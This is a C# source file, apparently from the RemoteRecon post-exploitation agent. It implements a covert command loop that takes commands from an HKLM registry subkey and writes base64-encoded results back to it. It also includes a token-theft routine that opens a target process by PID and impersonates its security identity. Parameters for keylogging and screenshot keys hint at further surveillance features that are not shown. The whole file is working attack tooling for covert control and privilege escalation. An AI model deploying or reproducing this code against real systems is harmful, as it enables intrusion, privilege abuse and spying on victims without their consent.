using System;
using System.Text;
using Microsoft.Win32;
using System.Security.Principal;
using System.Security;
using System.Runtime.InteropServices;
using System.Reflection;
using System.IO;
using System.Threading;
using System.Runtime.Remoting;
using System.Runtime.Remoting.Channels.Ipc;
using System.Runtime.Remoting.Channels;
using RemoteReconKS;

namespace RemoteReconCore
{
    public class Agent
    {
        //static vars 
        public static int sleep = 5;
        public static WindowsImpersonationContext context = null;
        public static string exceptionInfo;
        public Agent()
        {

        }

        public void Run(string basepath, string runkey, string commandkey, string argumentkey, string resultkey, string keylogkey, string screenshotkey)
        {
            RegistryKey hklm = Registry.LocalMachine;
            RegistryKey RemoteReconBase;

            //Open the base registry path for RemoteRecon C2
            try
            {
                RemoteReconBase = hklm.OpenSubKey(basepath, RegistryKeyPermissionCheck.ReadWriteSubTree);
            }
            catch (Exception)
            {
                //If we cant open the DarkRecon subkey, set to null so we cleanly exit
                RemoteReconBase = null;
            }

            //Main loop

            while ((RemoteReconBase != null) && (RemoteReconBase.GetValue(runkey) != null))
            {
                string result = "";
                string command = (string)RemoteReconBase.GetValue(commandkey);

                switch (command)
                {
                    case "impersonate":
                        //Obtain the pid from the arg key
                        string pid = (string)RemoteReconBase.GetValue(argumentkey);
                        RemoteReconBase.SetValue(argumentkey, "");
                        RemoteReconBase.SetValue(commandkey, "");
                        if (pid != null)
                        {
                            int ipid = Convert.ToInt32(pid);
                            context = impersonate(ipid);
                            result = "impersonated: " + WindowsIdentity.GetCurrent().Name;

                            if (context == null)
                            {
                                result = "impersonation failed";
                            }
                            //Write the result to the registry for retrieval
                            RemoteReconBase.SetValue(resultkey, Convert.ToBase64String(Encoding.ASCII.GetBytes(result)));
                            break;
                        }
                        result = "missing command argument";
                        RemoteReconBase.SetValue(resultkey, Convert.ToBase64String(Encoding.ASCII.GetBytes(result)));
                        break;

                    default:
                        break;
                }

                Thread.Sleep((sleep * 1000));
            }
        }

        public static WindowsImpersonationContext impersonate(int pid)
        {
            IntPtr hProcHandle = IntPtr.Zero;
            IntPtr hProcToken = IntPtr.Zero;

            WindowsImpersonationContext ctx = null;

            hProcHandle = WinApi.OpenProcess(WinApi.PROCESS_ALL_ACCESS, true, pid);

            if (hProcHandle == IntPtr.Zero)
            {
                hProcHandle = WinApi.OpenProcess(WinApi.PROCESS_QUERY_INFORMATION, true, pid);
                if (hProcHandle == IntPtr.Zero)
                {
                    return ctx;
                }
            }

            bool success = WinApi.OpenProcessToken(hProcHandle, WinApi.TOKEN_ALL_ACCESS, out hProcToken);

            if (!success)
            {
                return ctx;
            }

            WindowsIdentity newId = new WindowsIdentity(hProcToken);

            try
            {
                ctx = newId.Impersonate();
            }
            catch (Exception)
            {
                return null;
            }

            return ctx;
        }
    }
}
